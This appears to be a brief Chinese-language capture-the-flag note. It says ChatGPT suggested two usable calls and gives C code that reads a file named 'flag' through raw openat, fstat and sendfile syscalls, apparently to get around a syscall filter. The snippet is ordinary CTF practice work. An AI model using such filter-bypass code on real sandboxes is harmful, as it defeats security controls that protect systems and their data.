通过chatgpt，发现有两个函数可以利用,下面代码中第二步可以不需要，大小直接写100就行
```
int main() {
    // 1. 用 openat 打开文件
    int fd = syscall(SYS_openat, AT_FDCWD, "flag", O_RDONLY, 0);
    
    // 2. 用 fstat 获取文件大小
    struct stat st;
    syscall(SYS_fstat, fd, &st);
    
    // 3. 用 sendfile 将内容输出到 stdout
    syscall(SYS_sendfile, STDOUT_FILENO, fd, NULL, st.st_size);
    return 0;
}
```
